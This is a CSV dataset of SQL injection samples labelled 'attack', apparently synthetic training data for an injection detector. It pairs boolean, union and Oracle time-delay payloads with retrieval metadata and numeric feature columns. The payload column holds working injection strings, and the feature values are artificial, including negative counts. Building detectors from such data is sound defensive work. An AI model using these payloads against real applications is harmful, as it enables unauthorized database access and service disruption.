id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,boolean,"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003133,7.233667395446496,144.88153076171875,82.19732666015625,19.838003158569336,53.92386245727539,3.1943256855010986,60.86286544799805,37.56902313232422,0.9970971345901489,0.44281205534935,0.15557533502578735,0.2565308213233948,0.034260574728250504,3.982482433319092,-0.03114805929362774,-0.24355155229568481,1.589408278465271,0.48321732878685,0.15112370252609253,0.08127666264772415,6.375040054321289,6.309937953948975,4.452067852020264,0.03812791407108307,0.4864353835582733,0.10229739546775818,-0.06866318732500076,0.28785717487335205,0.3035823106765747,0.43700599670410156,-0.08137363195419312,0.0934351459145546,0.6150845289230347,0.24309608340263367,0.49631789326667786,1.2327687740325928,3.87784481048584,0.7304965257644653,1.2813470363616943,0.5611730217933655,0.0944313332438469,1.1900142431259155,0.04285314306616783,-0.043174538761377335,-0.04846097528934479,0.06990191340446472,0.10503525286912918,0.6332261562347412,0.6096785664558411,0.2751907706260681,0.34555086493492126,0.3389333188533783,-0.6562732458114624,0.13548266887664795,-0.05727608501911163,-0.019055062904953957,0.06839557737112045,0.4539657235145569,0.048098109662532806,0.3986506760120392,-0.008711641654372215,0.6671485304832458,0.00861353985965252,-2.9473814964294434,0.09229772537946701,0.18243248760700226,0.2211112082004547,0.469274640083313,0.9205310940742493,0.00043376744724810123,0.03790828213095665,0.007221021223813295,0.0014776326715946198,0.008099584840238094,0.031008223071694374,0.12010068446397781,0.5260308384895325,0.13059386610984802,0.0014213047688826919,-0.33303165435791016,0.14722155034542084,4.995240688323975,1.1247172355651855,0.1484529674053192,0.11531196534633636,-0.10043501108884811,0.11306873708963394,0.5764155387878418,-0.05567312240600586
GAN_000012,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,4.538214157557254,113.49691009521484,61.809757232666016,22.905059814453125,56.4408073425293,1.0387847423553467,48.61935806274414,26.30411148071289,0.9984168410301208,0.4587545692920685,0.171671524643898,0.2808161973953247,0.10090520232915878,3.7898595333099365,0.3116319477558136,0.57273930311203,0.9414511919021606,0.3856222331523895,0.08127326518297195,0.052825357764959335,4.986627101898193,5.67209529876709,4.205723285675049,0.030967319384217262,1.477818489074707,0.03575761988759041,0.021411681547760963,0.12889160215854645,-0.2769545018672943,0.33142879605293274,0.08624939620494843,0.039229679852724075,0.4584316909313202,-0.1310923993587494,0.432392954826355,1.3421698808670044,4.04541540145874,0.5396910309791565,1.413511872291565,0.5023394227027893,0.33062368631362915,0.6303144097328186,-0.023047056049108505,-0.03129696100950241,-0.0007629352039657533,0.04930025339126587,0.04591487720608711,0.3158627450466156,0.24640177190303802,0.08155953884124756,0.17014674842357635,0.182217538356781,-0.08947312831878662,0.006722850259393454,-0.008315788581967354,0.010374974459409714,0.04314640164375305,0.25770413875579834,0.005455374717712402,0.2976837158203125,-0.0003386781027074903,0.2749972343444824,0.001257303636521101,-0.3690524995326996,0.03990807756781578,0.02906683273613453,0.16579242050647736,0.08130732923746109,0.1448463797569275,-0.004153291694819927,0.03231236711144447,0.0012001205468550324,-0.0009676826884970069,-0.006138795055449009,0.023411763831973076,0.0990387573838234,0.6589746475219727,0.3475148677825928,0.0031523089855909348,0.07707922905683517,0.08819287270307541,4.880869388580322,0.859728217124939,0.19596818089485168,0.14107029139995575,-0.056588828563690186,0.03718975558876991,0.40164992213249207,-0.03810150921344757
GAN_000013,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R002117,4.804825358683228,94.54713439941406,53.51355743408203,23.871471405029297,49.781494140625,0.46879273653030396,36.19432067871094,18.022043228149414,0.9988563656806946,0.4008137881755829,0.2452835589647293,0.269853800535202,0.11484549939632416,3.635296106338501,0.7017256617546082,0.7995502948760986,0.9570097327232361,0.5091578364372253,0.011780689470469952,-0.021206650882959366,4.582073211669922,5.031888961791992,3.9926939010620117,0.01858534663915634,1.3977364301681519,0.021254606544971466,0.03015817701816559,0.016513317823410034,0.02959281951189041,0.1801784634590149,0.042421452701091766,0.026530513539910316,0.3825802206993103,0.04052583500742912,0.4664219617843628,1.1379576921463013,4.4202094078063965,0.12998200953006744,1.2727936506271362,0.6736871004104614,0.6645720601081848,0.502767026424408,-0.09794683009386063,-0.009302763268351555,-0.04040251299738884,0.04008461907505989,0.053084708750247955,0.2480221539735794,0.2019290179014206,-0.0407843254506588,0.08491780608892441,0.21080200374126434,-0.054777659475803375,0.05740780010819435,0.03299965336918831,-0.02651374787092209,0.08700183033943176,0.10405100136995316,-0.029239997267723083,0.33988484740257263,-0.0033722659572958946,0.0040765851736068726,-0.0028074951842427254,0.21916306018829346,0.04792217165231705,0.006674488540738821,0.1991502195596695,0.12253601104021072,-0.005376018583774567,-0.006788039114326239,0.010507071390748024,0.0006484800833277404,0.0010638200910761952,0.021987993270158768,0.012827313505113125,0.11319396644830704,0.08946436643600464,0.39049774408340454,0.01023393776267767,0.06301119923591614,0.0516829751431942,5.254651069641113,0.7614161968231201,0.43845483660697937,0.10301411151885986,0.010311391204595566,-0.014556040987372398,0.6288296580314636,-0.005373679101467133
GAN_000014,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,6.154597785267159,130.36935424804688,79.05870056152344,25.420995712280273,67.45357513427734,4.400993824005127,39.53142166137695,27.126638412475586,0.9982902407646179,0.37671563029289246,0.21542398631572723,0.25886374711990356,0.08858140558004379,3.792480230331421,0.7852125763893127,0.5393613576889038,1.268033504486084,0.6183757781982422,0.03760821744799614,0.0018465849570930004,6.381738185882568,6.432794570922852,4.635903358459473,0.020365208387374878,0.8408654928207397,0.0918721854686737,-0.004100409802049398,0.09389377385377884,-0.4391043484210968,0.3096865713596344,-0.13677188754081726,0.054020319133996964,0.4609691798686981,0.09403160959482193,0.4303831458091736,1.213742971420288,4.086652755737305,0.04899163916707039,1.5552846193313599,0.9353328943252563,0.5783286690711975,0.9581565856933594,-0.04893707111477852,-0.008286254480481148,-0.08836052566766739,0.01510648988187313,0.08573787659406662,0.5292497277259827,0.4318278729915619,0.10991665720939636,0.2956387996673584,0.2521999776363373,-0.49545496702194214,0.07592674344778061,-0.0023229364305734634,-0.03268315643072128,0.10176116228103638,0.2776230573654175,0.011791776865720749,0.3547988533973694,-0.004739969037473202,0.22971270978450775,-0.007366585545241833,-0.5537104606628418,0.06719610095024109,0.09365581721067429,0.19985084235668182,0.7327830791473389,0.3675411641597748,-0.006999892182648182,-0.002951784525066614,0.003841723082587123,0.004190512001514435,0.013611240312457085,0.01370258815586567,0.1367017775774002,0.2734057903289795,0.21557103097438812,0.004224013537168503,-0.08698523044586182,0.00903994683176279,6.834193706512451,1.024641752243042,0.3818543553352356,-0.0027731943409889936,-0.01573064923286438,0.053073205053806305,0.49192896485328674,-0.028143666684627533
GAN_000015,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,4.089568111625961,110.54027557373047,58.348453521728516,23.85529899597168,55.9397087097168,1.6620312929153442,37.143333435058594,18.339662551879883,0.9995537996292114,0.35371074080467224,0.1896430104970932,0.30738890171051025,0.12784108519554138,3.6911427974700928,1.1033282279968262,1.0655409097671509,0.8229424357414246,0.3311450779438019,0.04064732417464256,0.009811585769057274,4.558690071105957,5.3002028465271,3.3001649379730225,0.011108065955340862,1.4521342515945435,0.04855910316109657,0.03112415410578251,0.13127470016479492,-0.30692288279533386,0.27904012799263,-0.0052380128763616085,0.017078084871172905,0.25464126467704773,-0.0431668683886528,0.5084531903266907,1.1852840185165405,4.032127857208252,0.3226149380207062,1.4371329545974731,0.47618868947029114,0.5699259638786316,0.5498471260070801,-0.012095985002815723,0.038104575127363205,-0.030846374109387398,0.001773801981471479,0.015906039625406265,0.2662535011768341,0.1592399775981903,0.05355224385857582,0.1419951170682907,0.13347794115543365,-0.15601101517677307,-0.0005770850693807006,0.03139068931341171,-0.016393352299928665,0.07809538394212723,0.13243383169174194,-0.0059814597479999065,0.26267969608306885,-0.001494123018346727,-0.09125055372714996,-0.0068046594969928265,0.4041251540184021,0.03540294989943504,0.005261946003884077,0.12469104677438736,0.2031913697719574,-0.1415349841117859,-0.005324635189026594,-0.0018910834332928061,0.0005712193087674677,0.0018017505062744021,0.009719901718199253,0.004477184731513262,0.0756831243634224,0.4303528666496277,0.3365670144557953,0.00269295577891171,0.1525227427482605,0.02779865264892578,5.273862361907959,0.7360475659370422,0.2618410289287567,0.0891961082816124,0.04199192672967911,0.010009434074163437,0.3182373344898224,-0.0019206946017220616
GAN_000016,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,4.873225204654779,115.57892608642578,57.292850494384766,22.56269073486328,37.753299713134766,0.7917048335075378,53.00483322143555,23.17407989501953,0.9985692501068115,0.41608065366744995,0.23123787343502045,0.2581613063812256,0.10763450711965561,3.6619677543640137,0.4141070544719696,0.6892962455749512,1.2923952341079712,0.4200715720653534,0.0673251748085022,-0.008968774229288101,5.574615955352783,4.9893951416015625,3.588075637817383,0.020765937864780426,1.126279354095459,0.023901749402284622,0.0063044242560863495,0.06878294050693512,0.17326150834560394,0.3103165328502655,0.07144781202077866,0.005666473414748907,0.5232502818107605,-0.07309405505657196,0.49634918570518494,1.170384168624878,5.207912445068359,0.2834761142730713,1.0517299175262451,0.5292717218399048,0.5477168560028076,0.5751280784606934,-0.07165919989347458,-0.03564072772860527,-0.003313676919788122,0.054205745458602905,0.0646127313375473,0.3036803901195526,0.2856760323047638,0.002714501926675439,0.04265674576163292,0.24783208966255188,-0.23728129267692566,0.08666272461414337,0.0099729523062706,-0.014489072374999523,0.07311432808637619,0.17052984237670898,-0.013403945602476597,0.304340660572052,-0.0076134344562888145,0.24575166404247284,0.0032126319129019976,-0.16539797186851501,0.051477234810590744,0.02001003548502922,0.17786896228790283,0.046902380883693695,-0.05412980169057846,-0.006180029362440109,0.012104732915759087,0.0041366699151694775,-0.0011326911626383662,0.024441633373498917,0.020260879769921303,0.13061507046222687,0.012968572787940502,0.289804071187973,0.004162317607551813,0.014118848368525505,0.07132270932197571,5.27785062789917,0.6969487071037292,0.27041760087013245,0.11047651618719101,-0.005403690040111542,0.030263369902968407,0.5119131803512573,-0.020625876262784004
GAN_000017,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,4.380465315829352,106.82583618164062,61.700775146484375,19.301647186279297,49.10239791870117,0.8263672590255737,51.6963005065918,26.498559951782227,0.9990198016166687,0.4481917917728424,0.11657767742872238,0.3308074474334717,0.09352473169565201,3.8368546962738037,0.6357077956199646,0.4427202641963959,0.9689844846725464,0.21626093983650208,0.13262243568897247,0.09032876044511795,3.7051138877868652,6.110253810882568,3.2562601566314697,0.02482040598988533,1.4335681200027466,0.028904039412736893,0.017288846895098686,0.27659499645233154,0.10277193039655685,0.35214775800704956,0.0714663416147232,0.05889269337058067,0.2600078582763672,-0.14661699533462524,0.4916659891605377,1.3335744142532349,3.6488935947418213,1.0909366607666016,1.389457106590271,0.2220180183649063,0.13731709122657776,0.6320071220397949,0.03322514891624451,-0.024473311379551888,0.008767585270106792,0.0545501671731472,0.018443383276462555,0.3515487313270569,0.255489319562912,0.14814598858356476,0.15615102648735046,0.2154071033000946,-0.23955431580543518,-0.015317203477025032,0.014654064550995827,0.015496937558054924,-0.0006708213477395475,0.2404261976480484,0.02090786024928093,0.4068664014339447,0.0023906512651592493,0.24763797223567963,0.0023397488985210657,-0.9961767196655273,0.03638661280274391,0.05396489426493645,0.18377217650413513,-0.06196004897356033,0.28645604848861694,0.0011749772820621729,0.035264674574136734,0.0007100641960278153,-0.002606967929750681,-0.019764991477131844,0.019260451197624207,0.07975291460752487,0.8690745234489441,0.27320119738578796,-0.0022278400138020515,0.05806948244571686,0.1141461730003357,3.527430295944214,0.7287355661392212,0.028737984597682953,0.18680024147033691,0.0020009614527225494,0.03327587619423866,0.40403836965560913,-0.026420654729008675
GAN_000018,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,5.431128032649875,117.83626556396484,75.14950561523438,24.292898178100586,70.0755386352539,2.740535259246826,47.430580139160156,27.76337432861328,0.9986715316772461,0.4235970973968506,0.1703997552394867,0.3057960569858551,0.08573202788829803,3.76692795753479,0.4480976164340973,0.638547956943512,1.1790446043014526,0.5469388961791992,0.07311277836561203,0.033641841262578964,5.821643352508545,6.58848762512207,4.230972766876221,0.03261055052280426,1.0606144666671753,0.0794776901602745,-0.003979729022830725,0.14192263782024384,-0.14700616896152496,0.3673159182071686,-0.06048876792192459,0.07780583202838898,0.37981826066970825,-0.032259903848171234,0.3611694276332855,1.335566520690918,4.225278854370117,0.3688777685165405,1.7360405921936035,0.7206884026527405,0.473768413066864,0.9811148047447205,-0.01948871836066246,-0.005935223773121834,-0.07156522572040558,0.028069591149687767,0.0857485681772232,0.4713367223739624,0.37187814712524414,0.131506085395813,0.30529195070266724,0.30189618468284607,-0.3573762774467468,0.046576887369155884,0.02550383284687996,-0.02291700802743435,0.07479509711265564,0.31793007254600525,0.004393770359456539,0.36971908807754517,-0.009234241209924221,0.26397931575775146,-3.403754089958966e-05,-0.710981011390686,0.055694837123155594,0.07479875534772873,0.19445405900478363,0.3876781463623047,0.6865009665489197,-0.0054369959980249405,0.01957186870276928,-0.0001634244981687516,0.00237176357768476,-0.0011197514832019806,0.01109898742288351,0.10994310677051544,0.5599812269210815,0.15481071174144745,0.0015616160817444324,-0.09291832149028778,0.07062075287103653,5.894509792327881,0.9361920356750488,0.21654129028320312,0.08737506717443466,-0.00582132488489151,0.04861321672797203,0.5001950263977051,-0.029131587594747543
GAN_000019,attack,boolean,"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002704,5.1801911453755265,120.1707763671875,70.6474380493164,15.938946723937988,53.34976577758789,1.4132753610610962,55.84968185424805,30.779125213623047,0.9987322092056274,0.4615594148635864,0.044990669935941696,0.3445594906806946,0.0761437714099884,3.967534303665161,0.34434744715690613,0.2326609492301941,1.0553210973739624,0.18560299277305603,0.20022806525230408,0.13667255640029907,4.934800624847412,6.94398307800293,3.4283595085144043,0.03232254087924957,1.2496510744094849,0.04321872442960739,-0.0009963487973436713,0.35699573159217834,0.10130616277456284,0.47773081064224243,0.016144055873155594,0.08379065990447998,0.24372108280658722,-0.04570052772760391,0.4930519163608551,1.5859464406967163,3.4806928634643555,1.373669981956482,1.6804909706115723,0.1448935568332672,0.023825308308005333,0.8635277152061462,0.08360493928194046,-0.013794748112559319,-0.0025897338055074215,0.06381846219301224,0.030432945117354393,0.4691220819950104,0.3160374164581299,0.23025566339492798,0.23801639676094055,0.2852163314819336,-0.39678627252578735,-0.0314122810959816,-0.028819328173995018,0.022050540894269943,-0.006242928095161915,0.36095955967903137,0.04552390053868294,0.35273289680480957,0.0014678504085168242,0.4369966983795166,0.004282098263502121,-1.8523277044296265,0.010345209389925003,0.08200014382600784,0.203910231590271,0.08405908197164536,0.4698706865310669,0.0022478927858173847,0.03155006468296051,0.003719998523592949,-0.0023516954388469458,-0.032130252569913864,0.021361252292990685,0.07735268771648407,1.154747486114502,0.14060841500759125,-0.0054825968109071255,-0.03755295276641846,0.13558237254619598,3.332280158996582,0.8886381387710571,-0.13634474575519562,0.20616517961025238,-0.028363004326820374,0.07033669948577881,0.3326880931854248,-0.03558649495244026
GAN_000020,attack,boolean,"1   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003545,4.9872480405240145,124.3823013305664,59.33464050292969,17.213260650634766,36.46829605102539,0.9959864616394043,48.76004409790039,25.568479537963867,0.997863233089447,0.41045165061950684,0.15868842601776123,0.278095543384552,0.08961006999015808,3.8991942405700684,0.2725546061992645,0.17872175574302673,1.3151569366455078,0.37639084458351135,0.07824841141700745,0.03449578583240509,5.050962448120117,5.564573287963867,3.694899797439575,0.030203266069293022,0.9596662521362305,0.027027420699596405,0.006572674959897995,0.20968936383724213,0.3399620056152344,0.3417675793170929,0.03815639391541481,0.013312212191522121,0.4838016927242279,-0.03972090035676956,0.5648595690727234,1.2708007097244263,4.302618026733398,0.54339599609375,1.1783677339553833,0.4262894093990326,0.22684621810913086,0.694590151309967,0.04643482714891434,-0.06188901141285896,-0.004895071964710951,0.07146911323070526,0.05259621515870094,0.4284081757068634,0.29852494597435,0.07704964280128479,0.10301999002695084,0.28310146927833557,-0.21590611338615417,0.10086732357740402,-0.06684141606092453,-0.016348276287317276,0.06486351042985916,0.3192746937274933,0.029882892966270447,0.3744991719722748,-0.004218323156237602,0.32831889390945435,0.006397343706339598,-1.4066178798675537,0.04844101518392563,0.056106481701135635,0.202673077583313,0.254900723695755,0.013794489204883575,-0.0029082531109452248,0.019800221547484398,0.006989085115492344,-0.001035798224620521,-0.0004844245850108564,0.03184185177087784,0.13308103382587433,0.25755247473716736,0.32334011793136597,0.00508821802213788,-0.11645364761352539,0.13580504059791565,4.615756511688232,0.9455655217170715,0.2060381919145584,0.1020231768488884,-0.06885113567113876,0.05920427292585373,0.44839420914649963,-0.04058869183063507
GAN_000021,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R006778,4.947579128291273,113.50836181640625,65.47164916992188,14.685144424438477,44.32008361816406,0.5847256779670715,54.10441589355469,27.714990615844727,0.9988819360733032,0.44547662138938904,0.019772659987211227,0.3539561331272125,0.08391333371400833,3.9708364009857178,0.6047872304916382,0.24216029047966003,1.0663869380950928,0.07707325369119644,0.1893441379070282,0.11641588062047958,4.7316179275512695,7.262739181518555,2.9012653827667236,0.02829383872449398,1.3175194263458252,0.020049946382641792,0.025523096323013306,0.3578208386898041,0.26792001724243164,0.4730110168457031,0.014684819616377354,0.061414334923028946,0.20956993103027344,0.027115873992443085,0.5621299743652344,1.683347463607788,4.156391143798828,1.443973183631897,1.6784181594848633,0.03464512526988983,0.01656683348119259,0.7451213598251343,0.06915666908025742,-0.02416214533150196,-0.0024269367568194866,0.06244494020938873,0.003243051702156663,0.48288214206695557,0.24862946569919586,0.22586892545223236,0.1869116872549057,0.3109422028064728,-0.2521970868110657,-0.03248671442270279,-0.05283205956220627,0.013812104240059853,0.0026675956323742867,0.33132404088974,0.04877159744501114,0.309510201215744,0.001297463197261095,0.2648097276687622,0.005219799466431141,-1.7415660619735718,-0.010786662809550762,0.06570090353488922,0.22690629959106445,0.037566401064395905,0.27339839935302734,0.0014886277494952083,0.023662559688091278,0.005135365296155214,-0.002784389303997159,-0.023351745679974556,0.024279741570353508,0.08016885071992874,1.1134883165359497,0.16428644955158234,-0.004019669722765684,-0.003955671098083258,0.15279656648635864,3.059795618057251,0.8346590399742126,-0.16637717187404633,0.2232610434293747,-0.01463211327791214,0.06215617060661316,0.26541653275489807,-0.02666836977005005
GAN_000022,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,4.6052815917226875,118.0833969116211,60.63935852050781,17.905019760131836,40.151119232177734,0.7747262120246887,46.43036651611328,26.68954086303711,0.9985702037811279,0.39562898874282837,0.16763028502464294,0.30417829751968384,0.09919034689664841,3.74989914894104,0.33726736903190613,0.15808042883872986,1.0629998445510864,0.34195950627326965,0.12886840105056763,0.04725059121847153,4.691932201385498,5.002683639526367,3.0229954719543457,0.0196050014346838,0.772645115852356,0.020850757136940956,-0.035920724272727966,0.25346705317497253,0.3086068332195282,0.2925436496734619,0.010549592785537243,0.03796758875250816,0.36635613441467285,0.24086618423461914,0.5709640383720398,1.2456468343734741,3.0463879108428955,0.6175190806388855,0.8866531252861023,0.322996586561203,0.296695739030838,0.7544710040092468,0.04573124647140503,0.007047304883599281,-0.005004154052585363,0.07691407948732376,0.05366154760122299,0.35727015137672424,0.3122834265232086,0.10031772404909134,0.12296681851148605,0.30010950565338135,-0.2602803111076355,0.08685904741287231,-0.016454899683594704,-0.008410865440964699,0.05275486782193184,0.2521076798439026,0.030844796448946,0.340408593416214,-0.0016534983878955245,0.3876808285713196,0.00344211352057755,-1.4312384128570557,0.05304615572094917,0.07183483242988586,0.22309696674346924,0.19937121868133545,0.20241227746009827,0.0012169050751253963,0.007374843582510948,0.0057305628433823586,0.0014889605809003115,0.009442977607250214,0.01956937275826931,0.08396434783935547,0.36832213401794434,0.2770688235759735,0.004013498313724995,-0.1177806705236435,0.11327794194221497,4.138730525970459,0.7979103922843933,0.1767496019601822,0.11688169091939926,-0.023524761199951172,0.07071620225906372,0.41960108280181885,-0.021593868732452393
GAN_000023,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,3.5937517637434926,105.24230194091797,50.67232894897461,20.625642776489258,53.10678482055664,0.6265242695808411,38.342063903808594,22.109773635864258,0.9995746612548828,0.3918776214122772,0.12701311707496643,0.34133654832839966,0.12493222206830978,3.6478497982025146,1.0071107149124146,0.745324969291687,0.8558226227760315,0.23782041668891907,0.10126185417175293,0.037932612001895905,3.609511613845825,5.552661895751953,2.7015953063964844,0.012527254410088062,1.3796247243881226,0.006464581936597824,0.0327945277094841,0.14384418725967407,0.029253162443637848,0.29615411162376404,0.051877401769161224,0.03326735645532608,0.19862306118011475,-0.15407794713974,0.4951016306877136,1.3789911270141602,3.704652786254883,0.7258475422859192,1.463546872138977,0.31081339716911316,0.3698965311050415,0.6202389597892761,0.0022191358730196953,0.002476375550031662,-0.01660236157476902,0.03696072846651077,0.0067071691155433655,0.2527475953102112,0.11843135952949524,0.090205118060112,0.13142108917236328,0.19249318540096283,-0.09292726218700409,-0.02859927900135517,0.02619381994009018,0.002578110434114933,0.034444067627191544,0.1657351702451706,0.006406908389180899,0.1983564794063568,0.0012156697921454906,-0.02891073375940323,-0.0038583334535360336,0.13048961758613586,0.010404299944639206,0.002460240852087736,0.1637178361415863,-0.10412077605724335,0.09598025679588318,-0.002688537584617734,0.009386742487549782,0.0006434140377677977,-0.00025210861349478364,-0.00660510640591383,0.011087808758020401,0.06788231432437897,0.7118881344795227,0.26956650614738464,0.0010498168412595987,0.13898110389709473,0.050385430455207825,4.52428674697876,0.7140370011329651,0.14763204753398895,0.08105644583702087,0.04727895185351372,0.0013962589437142015,0.20756983757019043,-0.011417442932724953
GAN_000024,attack,boolean,"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002148,6.019734982017626,150.5976104736328,69.59017181396484,25.164148330688477,37.41354751586914,4.143045425415039,61.43699645996094,24.337141036987305,0.9987496733665466,0.37074998021125793,0.2999744713306427,0.2041405737400055,0.09734877943992615,3.834620714187622,0.5495984554290771,0.8277963399887085,1.5651816129684448,0.4460369050502777,0.043932925909757614,-0.028735291212797165,7.404559135437012,5.199897289276123,4.07584810256958,0.01245510671287775,0.8723044991493225,0.09411079436540604,0.016143828630447388,0.13645997643470764,-0.3667694628238678,0.22343909740447998,-0.0034374978858977556,-0.010462281294167042,0.6440305113792419,0.005751058459281921,0.6689138412475586,0.890984296798706,6.439457416534424,0.07521457970142365,0.9607124328613281,0.6726210117340088,0.561517059803009,0.5889371037483215,-0.06831709295511246,-0.0007240456179715693,-0.025559091940522194,0.005104646552354097,0.06280983984470367,0.5431037545204163,0.3580479323863983,0.035908911377191544,0.0805770680308342,0.14688162505626678,-0.4544880986213684,0.12630058825016022,0.022319454699754715,-0.05330505222082138,0.1347336322069168,0.1750134378671646,-0.016032712534070015,0.4698999524116516,-0.014547472819685936,0.10645164549350739,0.0004712680820375681,-0.36318913102149963,0.0903623104095459,0.0567423552274704,0.09064524620771408,0.513809859752655,-0.2727636694908142,-0.005920073017477989,0.005861903075128794,0.00477737607434392,-0.0011433196486905217,0.045495349913835526,0.012299897149205208,0.17599734663963318,-0.3471599519252777,0.2442041039466858,-0.00023384502856060863,-0.03247012197971344,0.015458893962204456,6.751613140106201,0.6829145550727844,0.30953449010849,0.059583090245723724,0.003802623599767685,0.03133882209658623,0.5743292570114136,-0.014622155576944351
